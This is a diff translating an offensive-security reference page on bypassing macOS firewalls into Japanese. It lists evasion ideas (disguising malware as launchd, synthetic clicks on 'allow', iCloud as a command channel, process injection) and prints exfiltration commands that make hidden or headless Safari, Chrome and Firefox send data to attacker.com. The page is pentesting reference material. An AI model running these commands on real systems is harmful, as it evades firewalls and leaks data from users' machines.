@@ -1,85 +1,75 @@
-# macOS Bypassing Firewalls
+# macOS ファイアウォールのバイパス
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Found techniques
+## 発見された技術
 
-The following techniques were found working in some macOS firewall apps.
+以下の技術は、いくつかの macOS ファイアウォールアプリで動作することが確認されました。
 
-### Abusing whitelist names
+### ホワイトリスト名の悪用
 
-- For example calling the malware with names of well known macOS processes like **`launchd`**
+- 例えば、**`launchd`** のようなよく知られた macOS プロセスの名前でマルウェアを呼び出すこと。
 
-### Synthetic Click
+### 合成クリック
 
-- If the firewall ask for permission to the user make the malware **click on allow**
+- ファイアウォールがユーザーに許可を求める場合、マルウェアに **許可をクリックさせる**。
 
-### **Use Apple signed binaries**
+### **Apple 署名のバイナリを使用**
 
-- Like **`curl`**, but also others like **`whois`**
+- **`curl`** のようなもの、他にも **`whois`** など。
 
-### Well known apple domains
+### よく知られた Apple ドメイン
 
-The firewall could be allowing connections to well known apple domains such as **`apple.com`** or **`icloud.com`**. And iCloud could be used as a C2.
+ファイアウォールは、**`apple.com`** や **`icloud.com`** のようなよく知られた Apple ドメインへの接続を許可している可能性があります。そして、iCloud は C2 として使用される可能性があります。
 
-### Generic Bypass
+### 一般的なバイパス
 
-Some ideas to try to bypass firewalls
+ファイアウォールをバイパスするためのいくつかのアイデア。
 
-### Check allowed traffic
+### 許可されたトラフィックの確認
 
-Knowing the allowed traffic will help you identify potentially whitelisted domains or which applications are allowed to access them
-
+許可されたトラフィックを知ることで、潜在的にホワイトリストに登録されたドメインや、どのアプリケーションがそれらにアクセスできるかを特定するのに役立ちます。
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
+### DNSの悪用
 
-### Abusing DNS
-
-DNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed to contact DNS servers.
+DNS解決は、DNSサーバーに接続することが許可されている可能性が高い**`mdnsreponder`**署名アプリケーションを介して行われます。
 
 <figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Via Browser apps
+### ブラウザアプリを介して
 
 - **oascript**
-
 ```applescript
 tell application "Safari"
-    run
-    tell application "Finder" to set visible of process "Safari" to false
-    make new document
-    set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
+run
+tell application "Finder" to set visible of process "Safari" to false
+make new document
+set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
 end tell
 ```
-
-- Google Chrome
-
+- グーグルクローム
 ```bash
 "Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
-- Firefox
-
+- ファイアフォックス
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
-- Safari
-
+- サファリ
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
+### プロセスインジェクションを介して
 
-### Via processes injections
-
-If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:
+接続を許可された**プロセスにコードを注入**できれば、ファイアウォールの保護を回避できます：
 
 {{#ref}}
 macos-proces-abuse/
 {{#endref}}
 
-## References
+## 参考文献
 
 - [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
